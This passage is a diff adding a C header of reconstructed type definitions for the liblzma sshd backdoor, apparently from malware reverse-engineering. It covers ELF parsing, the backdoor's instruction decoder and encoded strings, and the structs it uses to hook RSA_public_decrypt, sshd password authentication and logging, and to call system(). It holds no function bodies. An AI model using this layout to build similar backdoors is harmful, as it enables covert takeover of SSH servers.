@@ -1,0 +1,1824 @@
+typedef long ptrdiff_t;
+typedef unsigned long size_t;
+typedef long ssize_t;
+typedef unsigned long uintptr_t;
+typedef long intptr_t;
+typedef signed char int8_t;
+typedef unsigned char uint8_t;
+typedef short int16_t;
+typedef unsigned short uint16_t;
+typedef int int32_t;
+typedef unsigned int uint32_t;
+typedef long long int64_t;
+typedef unsigned long long uint64_t;
+void hexdump(void *pAddressIn, long lSize);
+typedef uint8_t u8;
+typedef uint16_t u16;
+typedef uint32_t u32;
+typedef uint64_t u64;
+typedef uintptr_t uptr;
+typedef unsigned int pid_t;
+typedef unsigned int uid_t;
+typedef unsigned int gid_t;
+typedef unsigned int mode_t;
+typedef uint16_t Elf64_Half;
+typedef uint32_t Elf64_Word;
+typedef int32_t Elf64_Sword;
+typedef uint64_t Elf64_Xword;
+typedef int64_t Elf64_Sxword;
+typedef uint32_t Elf32_Addr;
+typedef uint64_t Elf64_Addr;
+typedef uint64_t Elf64_Off;
+typedef uint16_t Elf64_Section;
+typedef Elf64_Xword Elf64_Relr;
+typedef struct
+{
+  unsigned char e_ident[(16)];
+  Elf64_Half e_type;
+  Elf64_Half e_machine;
+  Elf64_Word e_version;
+  Elf64_Addr e_entry;
+  Elf64_Off e_phoff;
+  Elf64_Off e_shoff;
+  Elf64_Word e_flags;
+  Elf64_Half e_ehsize;
+  Elf64_Half e_phentsize;
+  Elf64_Half e_phnum;
+  Elf64_Half e_shentsize;
+  Elf64_Half e_shnum;
+  Elf64_Half e_shstrndx;
+} Elf64_Ehdr;
+typedef struct
+{
+  Elf64_Word p_type;
+  Elf64_Word p_flags;
+  Elf64_Off p_offset;
+  Elf64_Addr p_vaddr;
+  Elf64_Addr p_paddr;
+  Elf64_Xword p_filesz;
+  Elf64_Xword p_memsz;
+  Elf64_Xword p_align;
+} Elf64_Phdr;
+typedef struct
+{
+  Elf64_Sxword d_tag;
+  union
+    {
+      Elf64_Xword d_val;
+      Elf64_Addr d_ptr;
+    } d_un;
+} Elf64_Dyn;
+typedef struct
+{
+  Elf64_Word st_name;
+  unsigned char st_info;
+  unsigned char st_other;
+  Elf64_Section st_shndx;
+  Elf64_Addr st_value;
+  Elf64_Xword st_size;
+} Elf64_Sym;
+typedef struct
+{
+  Elf64_Addr r_offset;
+  Elf64_Xword r_info;
+  Elf64_Sxword r_addend;
+} Elf64_Rela;
+typedef uptr
+ Elf32_Sym, Elf64_Relr,
+ Elf64_Verdef, Elf64_Versym, sigset_t, fd_set, EVP_PKEY, RSA, DSA,
+ BIGNUM, EC_POINT, EC_KEY, EC_GROUP, EVP_MD, point_conversion_form_t,
+ EVP_CIPHER, EVP_CIPHER_CTX, ENGINE, EVP_MD_CTX, EVP_PKEY_CTX, BN_CTX;
+typedef struct {
+ void *(*alloc)(void *opaque, size_t nmemb, size_t size);
+ void (*free)(void *opaque, void *ptr);
+ void *opaque;
+} lzma_allocator;
+typedef long int Lmid_t;
+typedef enum {
+ LZMA_CHECK_NONE = 0,
+ LZMA_CHECK_CRC32 = 1,
+ LZMA_CHECK_CRC64 = 4,
+ LZMA_CHECK_SHA256 = 10
+} lzma_check;
+struct auditstate
+{
+   uintptr_t cookie;
+   unsigned int bindflags;
+};
+typedef struct link_map *lookup_t;
+typedef struct gnu_hash_table {
+ uint32_t nbuckets;
+ uint32_t symoffset;
+ uint32_t bloom_size;
+ uint32_t bloom_shift;
+ uint64_t bloom[];
+} gnu_hash_table_t;
+struct La_i86_regs;
+struct La_i86_retval;
+struct La_x86_64_regs;
+struct La_x86_64_retval;
+struct La_x32_regs;
+struct La_x32_retval;
+struct audit_ifaces
+{
+ void (*activity) (uintptr_t *, unsigned int);
+ char *(*objsearch) (const char *, uintptr_t *, unsigned int);
+ unsigned int (*objopen) (struct link_map *, Lmid_t, uintptr_t *);
+ void (*preinit) (uintptr_t *);
+ union
+ {
+  uintptr_t (*symbind32) (Elf32_Sym *, unsigned int, uintptr_t *,
+   uintptr_t *, unsigned int *, const char *);
+  uintptr_t (*symbind64) (Elf64_Sym *, unsigned int, uintptr_t *,
+   uintptr_t *, unsigned int *, const char *);
+ };
+ union
+ {
+  Elf32_Addr (*i86_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
+   uintptr_t *, struct La_i86_regs *,
+   unsigned int *, const char *name,
+   long int *framesizep);
+  Elf64_Addr (*x86_64_gnu_pltenter) (Elf64_Sym *, unsigned int,
+   uintptr_t *,
+   uintptr_t *, struct La_x86_64_regs *,
+   unsigned int *, const char *name,
+   long int *framesizep);
+  Elf32_Addr (*x32_gnu_pltenter) (Elf32_Sym *, unsigned int, uintptr_t *,
+   uintptr_t *, struct La_x32_regs *,
+   unsigned int *, const char *name,
+   long int *framesizep);
+ };
+ union
+ {
+   unsigned int (*i86_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
+   uintptr_t *, const struct La_i86_regs *,
+   struct La_i86_retval *, const char *);
+  unsigned int (*x86_64_gnu_pltexit) (Elf64_Sym *, unsigned int,
+   uintptr_t *,
+   uintptr_t *,
+   const struct La_x86_64_regs *,
+   struct La_x86_64_retval *,
+   const char *);
+  unsigned int (*x32_gnu_pltexit) (Elf32_Sym *, unsigned int, uintptr_t *,
+   uintptr_t *,
+   const struct La_x32_regs *,
+   struct La_x86_64_retval *,
+   const char *);
+ };
+ unsigned int (*objclose) (uintptr_t *);
+ struct audit_ifaces *next;
+};
+typedef struct {
+ uint32_t state[8];
+ uint64_t size;
+} lzma_sha256_state;
+typedef struct {
+ uint8_t buffer[64];
+ union {
+  uint32_t crc32;
+  uint64_t crc64;
+  lzma_sha256_state sha256;
+ } state;
+} lzma_check_state;
+enum X86_OPCODE {
+ X86_OPCODE_LEA = 0x8D,
+ X86_OPCODE_CALL = 0xE8,
+ X86_OPCODE_CMP = 0x3B,
+ X86_OPCODE_MOV = 0x89,
+ X86_OPCODE_MOV_LOAD = 0x8B,
+ X86_OPCODE_MOV_STORE = 0x8C
+};
+enum X86_REG {
+ X86_REG_RBP = 5
+};
+typedef int BOOL;
+typedef enum {
+ DF1_LOCK_REP = 1,
+ DF1_SEG = 2,
+ DF1_OSIZE = 4,
+ DF1_ASIZE = 8,
+ DF1_VEX = 0x10,
+ DF1_REX = 0x20,
+ DF1_MODRM = 0x40,
+ DF1_SIB = 0x80
+} InstructionFlags;
+typedef enum {
+ DF2_MEM_DISP = 0x1,
+ DF2_MEM_DISP8 = 0x2,
+ DF2_MEM_SEG_OFFS = 0x4,
+ DF2_FLAGS_MEM = DF2_MEM_DISP | DF2_MEM_DISP8 | DF2_MEM_SEG_OFFS,
+ DF2_IMM = 0x8,
+ DF2_IMM64 = 0x10
+} InstructionFlags2;
+typedef enum {
+ X_ELF_PLTREL = 0x1,
+ X_ELF_RELA = 0x2,
+ X_ELF_RELR = 0x4,
+ X_ELF_VERDEF = 0x8,
+ X_ELF_VERSYM = 0x10,
+ X_ELF_NOW = 0x20
+} ElfFlags;
+typedef enum {
+ MRM_I_REG,
+ MRM_I_DISP1,
+ MRM_I_DISP4,
+ MRM_D_REG
+} ModRm_Mod;
+typedef enum {
+ FIND_ENDBR64,
+ FIND_NOP
+} FuncFindType;
+typedef enum {
+ X_ELF_MAIN = 0,
+ X_ELF_DYNAMIC_LINKER = 1,
+ X_ELF_LIBC = 2,
+ X_ELF_LIBCRYPTO = 3
+} ElfId;
+typedef enum {
+ XREF_xcalloc_zero_size = 0,
+ XREF_Could_not_chdir_to_home_directory_s_s = 1,
+ XREF_list_hostkey_types = 2,
+ XREF_demote_sensitive_data = 3,
+ XREF_mm_terminate = 4,
+ XREF_mm_pty_allocate = 5,
+ XREF_mm_do_pam_account = 6,
+ XREF_mm_session_pty_cleanup2 = 7,
+ XREF_mm_getpwnamallow = 8,
+ XREF_mm_sshpam_init_ctx = 9,
+ XREF_mm_sshpam_query = 10,
+ XREF_mm_sshpam_respond = 11,
+ XREF_mm_sshpam_free_ctx = 12,
+ XREF_mm_choose_dh = 13,
+ XREF_sshpam_respond = 14,
+ XREF_sshpam_auth_passwd = 15,
+ XREF_sshpam_query = 16,
+ XREF_start_pam = 17,
+ XREF_mm_request_send = 18,
+ XREF_mm_log_handler = 19,
+ XREF_Could_not_get_agent_socket = 20,
+ XREF_auth_root_allowed = 21,
+ XREF_mm_answer_authpassword = 22,
+ XREF_mm_answer_keyallowed = 23,
+ XREF_mm_answer_keyverify = 24,
+ XREF_48s_48s_d_pid_ld_ = 25,
+ XREF_Unrecognized_internal_syslog_level_code_d = 26
+} StringXrefId;
+typedef enum {
+ STR_from = 0x810,
+ STR_ssh2 = 0x678,
+ STR_48s_48s_d_pid_ld_ = 0xd8,
+ STR_s = 0x708,
+ STR_usr_sbin_sshd = 0x108,
+ STR_Accepted_password_for = 0x870,
+ STR_Accepted_publickey_for = 0x1a0,
+ STR_BN_bin2bn = 0xc40,
+ STR_BN_bn2bin = 0x6d0,
+ STR_BN_dup = 0x958,
+ STR_BN_free = 0x418,
+ STR_BN_num_bits = 0x4e0,
+ STR_Connection_closed_by = 0x790,
+ STR_Could_not_chdir_to_home_directory_s_s = 0x18,
+ STR_Could_not_get_agent_socket = 0xb0,
+ STR_DISPLAY = 0x960,
+ STR_DSA_get0_pqg = 0x9d0,
+ STR_DSA_get0_pub_key = 0x468,
+ STR_EC_KEY_get0_group = 0x7e8,
+ STR_EC_KEY_get0_public_key = 0x268,
+ STR_EC_POINT_point2oct = 0x6e0,
+ STR_EVP_CIPHER_CTX_free = 0xb28,
+ STR_EVP_CIPHER_CTX_new = 0x838,
+ STR_EVP_DecryptFinal_ex = 0x2a8,
+ STR_EVP_DecryptInit_ex = 0xc08,
+ STR_EVP_DecryptUpdate = 0x3f0,
+ STR_EVP_Digest = 0xf8,
+ STR_EVP_DigestVerify = 0x408,
+ STR_EVP_DigestVerifyInit = 0x118,
+ STR_EVP_MD_CTX_free = 0xd10,
+ STR_EVP_MD_CTX_new = 0xaf8,
+ STR_EVP_PKEY_free = 0x6f8,
+ STR_EVP_PKEY_new_raw_public_key = 0x758,
+ STR_EVP_PKEY_set1_RSA = 0x510,
+ STR_EVP_chacha20 = 0xc28,
+ STR_EVP_sha256 = 0xc60,
+ STR_EVP_sm = 0x188,
+ STR_GLIBC_2_2_5 = 0x8c0,
+ STR_GLRO_dl_naudit_naudit = 0x6a8,
+ STR_KRB5CCNAME = 0x1e0,
+ STR_LD_AUDIT = 0xcf0,
+ STR_LD_BIND_NOT = 0xbc0,
+ STR_LD_DEBUG = 0xa90,
+ STR_LD_PROFILE = 0xb98,
+ STR_LD_USE_LOAD_BIAS = 0x3e0,
+ STR_LINES = 0xa88,
+ STR_RSA_free = 0xac0,
+ STR_RSA_get0_key = 0x798,
+ STR_RSA_new = 0x918,
+ STR_RSA_public_decrypt = 0x1d0,
+ STR_RSA_set0_key = 0x540,
+ STR_RSA_sign = 0x8f8,
+ STR_SSH_2_0 = 0x990,
+ STR_TERM = 0x4a8,
+ STR_Unrecognized_internal_syslog_level_code_d = 0xe0,
+ STR_WAYLAND_DISPLAY = 0x158,
+ STR_errno_location = 0x878,
+ STR_libc_stack_end = 0x2b0,
+ STR_libc_start_main = 0x228,
+ STR_dl_audit_preinit = 0xa60,
+ STR_dl_audit_symbind_alt = 0x9c8,
+ STR_exit = 0x8a8,
+ STR_r_debug = 0x5b0,
+ STR_rtld_global = 0x5b8,
+ STR_rtld_global_ro = 0xa98,
+ STR_auth_root_allowed = 0xb8,
+ STR_authenticating = 0x1d8,
+ STR_demote_sensitive_data = 0x28,
+ STR_getuid = 0x348,
+ STR_ld_linux_x86_64_so = 0xa48,
+ STR_libc_so = 0x7d0,
+ STR_libcrypto_so = 0x7c0,
+ STR_liblzma_so = 0x590,
+ STR_libsystemd_so = 0x938,
+ STR_list_hostkey_types = 0x20,
+ STR_malloc_usable_size = 0x440,
+ STR_mm_answer_authpassword = 0xc0,
+ STR_mm_answer_keyallowed = 0xc8,
+ STR_mm_answer_keyverify = 0xd0,
+ STR_mm_answer_pam_start = 0x948,
+ STR_mm_choose_dh = 0x78,
+ STR_mm_do_pam_account = 0x40,
+ STR_mm_getpwnamallow = 0x50,
+ STR_mm_log_handler = 0xa8,
+ STR_mm_pty_allocate = 0x38,
+ STR_mm_request_send = 0xa0,
+ STR_mm_session_pty_cleanup2 = 0x48,
+ STR_mm_sshpam_free_ctx = 0x70,
+ STR_mm_sshpam_init_ctx = 0x58,
+ STR_mm_sshpam_query = 0x60,
+ STR_mm_sshpam_respond = 0x68,
+ STR_mm_terminate = 0x30,
+ STR_parse_PAM = 0xc58,
+ STR_password = 0x400,
+ STR_preauth = 0x4f0,
+ STR_pselect = 0x690,
+ STR_publickey = 0x7b8,
+ STR_read = 0x308,
+ STR_rsa_sha2_256 = 0x710,
+ STR_setlogmask = 0x428,
+ STR_setresgid = 0x5f0,
+ STR_setresuid = 0xab8,
+ STR_shutdown = 0x760,
+ STR_ssh_2_0 = 0xd08,
+ STR_ssh_rsa_cert_v01_openssh_com = 0x2c8,
+ STR_sshpam_auth_passwd = 0x88,
+ STR_sshpam_query = 0x90,
+ STR_sshpam_respond = 0x80,
+ STR_start_pam = 0x98,
+ STR_system = 0x9f8,
+ STR_unknown = 0x198,
+ STR_user = 0xb10,
+ STR_write = 0x380,
+ STR_xcalloc_zero_size = 0x10,
+ STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj = 0xb00,
+ STR_ELF = 0x300,
+} EncodedStringId;
+typedef enum {
+ PAYLOAD_STATE_INITIAL = -1
+} PayloadState;
+struct sshbuf {
+ u8 *d;
+ const u8 *cd;
+ size_t off;
+ size_t size;
+ size_t max_size;
+ size_t alloc;
+ int readonly;
+ u32 refcount;
+ struct sshbuf *parent;
+};
+;
+struct kex;
+struct monitor {
+ int m_recvfd;
+ int m_sendfd;
+ int m_log_recvfd;
+ int m_log_sendfd;
+ struct kex **m_pkex;
+ pid_t m_pid;
+};
+struct sensitive_data {
+ struct sshkey **host_keys;
+ struct sshkey **host_pubkeys;
+ struct sshkey **host_certificates;
+ int have_ssh2_key;
+};
+struct sshkey {
+ int type;
+ int flags;
+ RSA *rsa;
+ DSA *dsa;
+ int ecdsa_nid;
+ EC_KEY *ecdsa;
+ u8 *ed25519_sk;
+ u8 *ed25519_pk;
+ char *xmss_name;
+ char *xmss_filename;
+ void *xmss_state;
+ u8 *xmss_sk;
+ u8 *xmss_pk;
+ char sk_application;
+ u8 sk_flags;
+ struct sshbuf *sk_key_handle;
+ struct sshbuf *sk_reserved;
+ struct sshkey_cert *cert;
+ u8 *shielded_private;
+ size_t shielded_len;
+ u8 *shield_prekey;
+ size_t shield_prekey_len;
+};
+typedef struct __attribute__((packed)) got_ctx {
+ void *got_ptr;
+ void *return_address;
+ void *cpuid_fn;
+ ptrdiff_t got_offset;
+} got_ctx_t;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) elf_entry_ctx {
+ void *symbol_ptr;
+ got_ctx_t got_ctx;
+ u64 *frame_address;
+} elf_entry_ctx_t;
+;
+;
+;
+enum dasm_modrm_mask {
+ XZ_MODRM_RM = 0xFF000000,
+ XZ_MODRM_REG = 0x00FF0000,
+ XZ_MODRM_MOD = 0x0000FF00,
+ XZ_MODRM_RAW = 0x000000FF
+};
+typedef struct __attribute__((packed)) dasm_ctx {
+ u8* instruction;
+ u64 instruction_size;
+ union {
+  struct __attribute__((packed)) {
+   u8 flags;
+   u8 flags2;
+   u8 _unknown752[2];
+   u8 lock_rep_byte;
+   u8 seg_byte;
+   u8 osize_byte;
+   u8 asize_byte;
+   u8 vex_byte;
+   u8 vex_byte2;
+   u8 vex_byte3;
+   union {
+    struct __attribute__((packed)) {
+     u8 B : 1;
+     u8 X : 1;
+     u8 R : 1;
+     u8 W : 1;
+     u8 BitPattern : 4;
+    };
+    u8 rex_byte;
+   };
+   union {
+    struct __attribute__((packed)) {
+             u8 modrm;
+             u8 modrm_mod;
+             u8 modrm_reg;
+             u8 modrm_rm;
+    };
+    u32 modrm_word;
+   };
+  };
+  u16 flags_u16;
+        };
+ u8 imm64_reg;
+ struct __attribute__((packed)) {
+  union {
+   struct __attribute__((packed)) {
+    u8 sib;
+    u8 sib_scale;
+    u8 sib_index;
+    u8 sib_base;
+   };
+   u32 sib_word;
+  };
+ };
+ u8 _unknown795[3];
+ u32 opcode;
+ u8 _unknown797[4];
+ u64 mem_disp;
+ u64 operand;
+ u64 operand_zeroextended;
+ u64 operand_size;
+ u8 insn_offset;
+ u8 _unknown804[7];
+} dasm_ctx_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) elf_info {
+ Elf64_Ehdr *elfbase;
+ u64 first_vaddr;
+ Elf64_Phdr *phdrs;
+ u64 e_phnum;
+ Elf64_Dyn *dyn;
+ u64 dyn_num_entries;
+ char *strtab;
+ Elf64_Sym *symtab;
+ Elf64_Rela *plt_relocs;
+ u32 plt_relocs_num;
+ BOOL gnurelro_found;
+ u64 gnurelro_vaddr;
+ u64 gnurelro_memsize;
+ Elf64_Verdef *verdef;
+ u64 verdef_num;
+ Elf64_Versym *versym;
+ Elf64_Rela *rela_relocs;
+ u32 rela_relocs_num;
+ u32 _unused0;
+ Elf64_Relr *relr_relocs;
+ u32 relr_relocs_num;
+ u8 _unknown905[4];
+ u64 code_segment_start;
+ u64 code_segment_size;
+ u64 rodata_segment_start;
+ u64 rodata_segment_size;
+ u64 data_segment_start;
+ u64 data_segment_size;
+ u64 data_segment_alignment;
+ u8 flags;
+ u8 _unknown924[7];
+ u32 gnu_hash_nbuckets;
+ u32 gnu_hash_last_bloom;
+ u32 gnu_hash_bloom_shift;
+ u8 _unknown934[4];
+ u64 *gnu_hash_bloom;
+ u32 *gnu_hash_buckets;
+ u32 *gnu_hash_chain;
+} elf_info_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) libc_imports {
+ u32 resolved_imports_count;
+ u8 _unknown978[4];
+ size_t (*malloc_usable_size)(void *ptr);
+ uid_t (*getuid)(void);
+ void (*exit)(int status);
+ int (*setresgid)(gid_t rgid, gid_t egid, gid_t sgid);
+ int (*setresuid)(uid_t ruid, uid_t euid, uid_t suid);
+ int (*system)(const char *command);
+ ssize_t (*write)(int fd, const void *buf, size_t count);
+ int (*pselect)(
+  int nfds, fd_set *readfds, fd_set *writefds,
+  fd_set *exceptfds, const struct timespec *timeout,
+  const sigset_t *sigmask);
+ ssize_t (*read)(int fd, void *buf, size_t count);
+ int *(*__errno_location)(void);
+ int (*setlogmask)(int mask);
+ int (*shutdown)(int sockfd, int how);
+ void *__libc_stack_end;
+} libc_imports_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef int (*pfn_RSA_public_decrypt_t)(
+ int flen, unsigned char *from, unsigned char *to,
+ RSA *rsa, int padding);
+typedef int (*pfn_EVP_PKEY_set1_RSA_t)(EVP_PKEY *pkey, struct rsa_st *key);
+typedef void (*pfn_RSA_get0_key_t)(
+ const RSA *r,
+ const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);
+typedef struct __attribute__((packed)) imported_funcs {
+ pfn_RSA_public_decrypt_t RSA_public_decrypt;
+ pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA;
+ void (*RSA_get0_key_null)(
+  const RSA *r, const BIGNUM **n,
+  const BIGNUM **e, const BIGNUM **d);
+ pfn_RSA_public_decrypt_t *RSA_public_decrypt_plt;
+ pfn_EVP_PKEY_set1_RSA_t *EVP_PKEY_set1_RSA_plt;
+ pfn_RSA_get0_key_t *RSA_get0_key_plt;
+ void (*DSA_get0_pqg)(
+  const DSA *d, const BIGNUM **p,
+  const BIGNUM **q, const BIGNUM **g);
+ const BIGNUM *(*DSA_get0_pub_key)(const DSA *d);
+ size_t (*EC_POINT_point2oct)(
+  const EC_GROUP *group, const EC_POINT *p,
+  point_conversion_form_t form, unsigned char *buf,
+  size_t len, BN_CTX *ctx);
+ EC_POINT *(*EC_KEY_get0_public_key)(const EC_KEY *key);
+ const EC_GROUP *(*EC_KEY_get0_group)(const EC_KEY *key);
+ EVP_MD *(*EVP_sha256)(void);
+ pfn_RSA_get0_key_t RSA_get0_key;
+ int (*BN_num_bits)(const BIGNUM *a);
+ EVP_PKEY *(*EVP_PKEY_new_raw_public_key)(
+  int type, ENGINE *e,
+  const unsigned char *key, size_t keylen);
+ EVP_MD_CTX *(*EVP_MD_CTX_new)(void);
+ int (*EVP_DigestVerifyInit)(
+  EVP_MD_CTX *ctx, EVP_PKEY_CTX **pctx,
+  const EVP_MD *type, ENGINE *e, EVP_PKEY *pkey);
+ int (*EVP_DigestVerify)(
+  EVP_MD_CTX *ctx, const unsigned char *sig,
+  size_t siglen, const unsigned char *tbs, size_t tbslen);
+ void (*EVP_MD_CTX_free)(EVP_MD_CTX *ctx);
+ void (*EVP_PKEY_free)(EVP_PKEY *key);
+ EVP_CIPHER_CTX *(*EVP_CIPHER_CTX_new)(void);
+ int (*EVP_DecryptInit_ex)(
+  EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type,
+  ENGINE *impl, const unsigned char *key, const unsigned char *iv);
+ int (*EVP_DecryptUpdate)(
+  EVP_CIPHER_CTX *ctx, unsigned char *out,
+  int *outl, const unsigned char *in, int inl);
+ int (*EVP_DecryptFinal_ex)(EVP_CIPHER_CTX *ctx, unsigned char *outm, int *outl);
+ void (*EVP_CIPHER_CTX_free)(EVP_CIPHER_CTX *ctx);
+ const EVP_CIPHER *(*EVP_chacha20)(void);
+ RSA *(*RSA_new)(void);
+ BIGNUM *(*BN_dup)(const BIGNUM *from);
+ BIGNUM *(*BN_bin2bn)(const unsigned char *s, int len, BIGNUM *ret);
+ int (*RSA_set0_key)(RSA *r, BIGNUM *n, BIGNUM *e, BIGNUM *d);
+ int (*EVP_Digest)(
+  const void *data, size_t count, unsigned char *md,
+  unsigned int *size, const EVP_MD *type, ENGINE *impl);
+ int (*RSA_sign)(
+  int type,
+  const unsigned char *m, unsigned int m_len,
+  unsigned char *sigret, unsigned int *siglen, RSA *rsa);
+ int (*BN_bn2bin)(const BIGNUM *a, unsigned char *to);
+ void (*RSA_free)(RSA *rsa);
+ void (*BN_free)(BIGNUM *a);
+ libc_imports_t *libc;
+ u32 resolved_imports_count;
+ u8 _unknown1094[4];
+} imported_funcs_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+struct ssh;
+struct sshbuf;
+typedef int (*sshd_monitor_func_t)(struct ssh *ssh, int sock, struct sshbuf *m);
+typedef struct __attribute__((packed)) sshd_ctx {
+ BOOL have_mm_answer_keyallowed;
+ BOOL have_mm_answer_authpassword;
+ BOOL have_mm_answer_keyverify;
+ u8 _unknown1145[0x4];
+ sshd_monitor_func_t mm_answer_authpassword_hook;
+ void *mm_answer_keyallowed;
+ void *mm_answer_keyverify;
+ void *mm_answer_authpassword_start;
+ void *mm_answer_authpassword_end;
+ sshd_monitor_func_t *mm_answer_authpassword_ptr;
+ int monitor_reqtype_authpassword;
+ u8 _unknown1153[4];
+ sshd_monitor_func_t *mm_answer_keyallowed_start;
+ void *mm_answer_keyallowed_end;
+ void *mm_answer_keyallowed_ptr;
+ u32 mm_answer_keyallowed_reqtype;
+ u8 _unknown1158[4];
+ void *mm_answer_keyverify_start;
+ void *mm_answer_keyverify_end;
+ void *mm_answer_keyverify_ptr;
+ u8 _unknown1162[0x4];
+ u16 writebuf_size;
+ u8 _unknown1164[0x2];
+ u8 *writebuf;
+ u8 _unknown1166[0x8];
+ u8 _unknown1167[0x8];
+ char *STR_unknown_ptr;
+ void *mm_request_send_start;
+ void *mm_request_send_end;
+ u8 _unknown1171[sizeof(u32)];
+ u8 _unknown1172[sizeof(u32)];
+ int *use_pam_ptr;
+ int *permit_root_login_ptr;
+ char *STR_without_password;
+ char *STR_publickey;
+} sshd_ctx_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef enum {
+ SYSLOG_LEVEL_QUIET,
+ SYSLOG_LEVEL_FATAL,
+ SYSLOG_LEVEL_ERROR,
+ SYSLOG_LEVEL_INFO,
+ SYSLOG_LEVEL_VERBOSE,
+ SYSLOG_LEVEL_DEBUG1,
+ SYSLOG_LEVEL_DEBUG2,
+ SYSLOG_LEVEL_DEBUG3,
+ SYSLOG_LEVEL_NOT_SET = -1
+} LogLevel;
+typedef void (*log_handler_fn)(
+ LogLevel level,
+ int forced,
+ const char *msg,
+ void *ctx);
+typedef struct __attribute__((packed)) sshd_log_ctx {
+ BOOL logging_disabled;
+ BOOL log_hooking_possible;
+ BOOL syslog_disabled;
+ u8 _unknown1228[4];
+ char *STR_percent_s;
+ char *STR_Connection_closed_by;
+ char *STR_preauth;
+ char *STR_authenticating;
+ char *STR_user;
+ void *log_handler_ptr;
+ void *log_handler_ctx_ptr;
+ log_handler_fn orig_log_handler;
+ void *orig_log_handler_ctx;
+ void *sshlogv;
+ void (*mm_log_handler)(int level, int forced, const char *msg, void *ctx);
+} sshd_log_ctx_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef union __attribute__((packed)) sshd_offsets_kex {
+ struct __attribute__((packed)) {
+  u8 kex_qword_index;
+  u8 pkex_offset;
+ };
+ u16 value;
+} sshd_offsets_kex_t;
+typedef union __attribute__((packed)) sshd_offsets_sshbuf {
+ struct __attribute__((packed)) {
+  u8 sshbuf_data_qword_index;
+  u8 sshbuf_size_qword_index;
+ };
+ u16 value;
+} sshd_offsets_sshbuf_t;
+typedef struct __attribute__((packed)) sshd_offsets_fields {
+ sshd_offsets_kex_t kex;
+ sshd_offsets_sshbuf_t sshbuf;
+} sshd_offsets_fields_t;
+typedef struct __attribute__((packed)) sshd_offsets {
+ union {
+  struct {
+   union {
+    sshd_offsets_fields_t fields;
+    u32 value;
+   };
+  };
+  u32 raw_value;
+ };
+} sshd_offsets_t;
+typedef struct __attribute__((packed)) sshd_payload_ctx {
+} sshd_payload_ctx_t;
+typedef struct __attribute__((packed)) global_context {
+ BOOL uses_endbr64;
+ u8 _unknown1299[4];
+ imported_funcs_t *imported_funcs;
+ libc_imports_t* libc_imports;
+ BOOL disable_backdoor;
+ u8 _unknown1318[4];
+ sshd_ctx_t *sshd_ctx;
+ struct sensitive_data *sshd_sensitive_data;
+ sshd_log_ctx_t *sshd_log_ctx;
+ char *STR_ssh_rsa_cert_v01_openssh_com;
+ char *STR_rsa_sha2_256;
+ struct monitor **struct_monitor_ptr_address;
+ u32 exit_flag;
+ sshd_offsets_t sshd_offsets;
+ void *sshd_code_start;
+ void *sshd_code_end;
+ void *sshd_data_start;
+ void *sshd_data_end;
+ void *sshd_main;
+ void *lzma_code_start;
+ void *lzma_code_end;
+ u32 uid;
+ u8 _unknown1366[4];
+ u64 sock_read_buf_size;
+ u8 sock_read_buf[64];
+ u64 payload_data_size;
+ u64 current_data_size;
+ u8 *payload_data;
+ sshd_payload_ctx_t *sshd_payload_ctx;
+ u32 sshd_host_pubkey_idx;
+ u32 payload_state;
+ u8 secret_data[57];
+ u8 shift_operations[31];
+ u32 num_shifted_bits;
+ u8 _unknown1394[4];
+} global_context_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) backdoor_shared_globals {
+ sshd_monitor_func_t mm_answer_authpassword_hook;
+ pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
+ global_context_t **globals;
+} backdoor_shared_globals_t;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) ldso_ctx {
+ u8 _unknown1444[0x40];
+ u32 *libcrypto_auditstate_bindflags_ptr;
+ u32 libcrypto_auditstate_bindflags_old_value;
+ u8 _unknown1461[0x4];
+ u32 *sshd_auditstate_bindflags_ptr;
+ u32 sshd_auditstate_bindflags_old_value;
+ u8 _unknown1478[0x4];
+ void* sshd_link_map_l_audit_any_plt_addr;
+ u8 link_map_l_audit_any_plt_bitmask;
+ u8 _unknown1495[0x7];
+ struct audit_ifaces **_dl_audit_ptr;
+ unsigned int *_dl_naudit_ptr;
+ struct audit_ifaces hooked_audit_ifaces;
+ u8 _unknown1523[0x30];
+ char **libcrypto_l_name;
+ void (*_dl_audit_symbind_alt)(struct link_map *l, const Elf64_Sym *ref, void **value, lookup_t result);
+ size_t _dl_audit_symbind_alt__size;
+ pfn_RSA_public_decrypt_t hook_RSA_public_decrypt;
+ pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
+ pfn_RSA_get0_key_t hook_RSA_get0_key;
+ imported_funcs_t *imported_funcs;
+ u64 hooks_installed;
+} ldso_ctx_t;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+typedef struct __attribute__((packed)) backdoor_hooks_data {
+ ldso_ctx_t ldso_ctx;
+ global_context_t global_ctx;
+ imported_funcs_t imported_funcs;
+ sshd_ctx_t sshd_ctx;
+ libc_imports_t libc_imports;
+ sshd_log_ctx_t sshd_log_ctx;
+ u64 signed_data_size;
